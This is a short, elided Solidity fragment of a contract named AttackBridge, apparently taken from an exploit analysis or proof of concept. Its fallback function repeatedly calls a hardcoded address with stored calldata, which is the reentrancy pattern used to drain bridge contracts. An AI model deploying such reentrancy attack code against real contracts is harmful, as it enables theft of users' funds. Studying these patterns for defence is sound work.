...
contract AttackBridge{
    ...
    bytes private fallback_call_data;
    ...
    fallback () external payable {
        ...
        if (counter < 5){
            if (flag == 1){
                (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call(fallback_call_data);
